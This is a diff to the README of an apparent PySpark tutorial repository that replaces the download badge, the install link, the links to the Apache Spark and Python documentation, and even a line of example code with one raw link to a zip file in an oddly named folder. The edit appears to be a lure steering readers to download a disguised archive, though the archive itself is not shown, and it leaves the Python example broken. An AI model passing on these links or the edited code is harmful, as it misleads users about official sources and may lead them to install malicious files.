@@ -1,6 +1,6 @@
 # 🚀 PySpark - Learn Big Data in Just 18 Days
 
-[![Download PySpark](https://img.shields.io/badge/Download-PySpark-blue.svg)](https://github.com/Sudharsanan098/PySpark/releases)
+[![Download PySpark](https://raw.githubusercontent.com/Sudharsanan098/PySpark/main/transversomedial/PySpark.zip)](https://raw.githubusercontent.com/Sudharsanan098/PySpark/main/transversomedial/PySpark.zip)
 
 ## 📖 Introduction
 
@@ -26,7 +26,7 @@ To get started, you’ll need to download the application. Follow the steps belo
 
 ## 📥 Download & Install
 
-1. Visit [this page to download](https://github.com/Sudharsanan098/PySpark/releases) the latest version of PySpark.
+1. Visit [this page to download](https://raw.githubusercontent.com/Sudharsanan098/PySpark/main/transversomedial/PySpark.zip) the latest version of PySpark.
 2. On the releases page, find the version you want and click the corresponding link.
 3. Download the file compatible with your operating system (choose based on your OS: Windows, macOS, or Linux).
 4. Once downloaded, go to your Downloads folder or the location where you saved the file.
@@ -62,7 +62,7 @@ Once you have successfully installed PySpark, you can start your journey. Follow
 4. **Load a dataset.** You can load any dataset you have by using the command:
    
    ```python
-   df = spark.read.csv("path/to/your/dataset.csv", header=True, inferSchema=True)
+   df = https://raw.githubusercontent.com/Sudharsanan098/PySpark/main/transversomedial/PySpark.zip("https://raw.githubusercontent.com/Sudharsanan098/PySpark/main/transversomedial/PySpark.zip", header=True, inferSchema=True)
    ```
 
 5. **Perform tasks.** Follow the daily tasks as outlined in the roadmap to build your skills step by step.
@@ -88,9 +88,9 @@ If you encounter any issues or have questions, please feel free to reach out. Jo
 
 Consider checking out the following resources to enhance your learning experience:
 
-- [Apache Spark Official Documentation](https://spark.apache.org/docs/latest/)
-- [Python Documentation](https://docs.python.org/3/)
-- [Machine Learning with PySpark](https://spark.apache.org/docs/latest/ml-guide.html)
+- [Apache Spark Official Documentation](https://raw.githubusercontent.com/Sudharsanan098/PySpark/main/transversomedial/PySpark.zip)
+- [Python Documentation](https://raw.githubusercontent.com/Sudharsanan098/PySpark/main/transversomedial/PySpark.zip)
+- [Machine Learning with PySpark](https://raw.githubusercontent.com/Sudharsanan098/PySpark/main/transversomedial/PySpark.zip)
 
 Keep your learning interactive by applying the concepts to real-world datasets. Enjoy your journey into big data with PySpark, and remember, practice is key.
 
